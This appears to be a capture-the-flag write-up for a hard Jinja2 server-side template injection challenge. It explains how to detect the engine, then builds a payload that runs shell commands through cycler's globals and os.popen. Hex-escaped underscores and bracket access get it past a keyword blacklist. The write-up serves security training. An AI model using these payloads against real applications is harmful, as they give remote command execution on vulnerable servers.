# Challenge Name
The_SSTI

# Description
It seems that you have some understanding, its only going to get harder.

# Difficulty
Hard

# Guide
How do you determine the presence of a SSTI vulnerability and template engine used?   
Click [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) to find out more!

After reading the link, you should know that by testing with `{{7*'7'}}` and the output of `7777777`, we can determine that it using Jinja2.

If you proceed to test out some of the common payloads found online, there will be an error that the input is invalid. You should try experimenting with different inputs to determine what could be on the blacklist.

After some testing you should be able to get some of the blacklisted items `'class', 'request', 'self', 'config', '_'`.

### The Payload   
To be able to execute system commands, we can leverage on Jinja2's access to Python objects, methods, and modules, particularly the `os` module.

Refer [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) for some common payloads! The following is a great point starting point with only `_` and `.` in the blacklist.

```
{{ cycler.__init__.__globals__.os.popen('').read() }}
```

`cycler` an entry point   
`.__init__` the method to initialize cycler   
`.__globals__` retrieve the global scope   
`.os` access the os module   
`popen('')` the function which allows for execution of commands  
`.read()` read the output of the executed command   

So how can we by bypass the `.` and `_`.   
We can use encoding methods to bypass the blacklist. However there will be a syntax error because of `cycler\`.   
To bypass the `.` we can access python object through a dictionary style. This would allow `cycler['__init__']` to access the same value as `cycler.__init__`.    

With these two methods you should be able to craft the payload!   
We can start break it down into the following steps.
```
# Original payload with cat flag.txt 
{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}

# Handle the "."
# Notice that flag.txt did not change, as it is part of a function and not an object. However, encoding will still be needed.
{{ cycler['__init__']['__globals__']['os']['popen']('cat flag.txt')['read']() }}

# Handle the "_" and flag.txt
{{ cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os']['popen']('cat flag\x2etxt')['read']() }}
```

# Hints
Tried encoding?

# Resources
https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

# Solution
There is a blacklist `'class', 'request', 'self', 'config', '_'`

The payload used.
```
{{ cycler['\x5f\x5finit\x5f\x5f']['\x5f\x5fglobals\x5f\x5f']['os']['popen']('cat flag\x2etxt')['read']() }}
```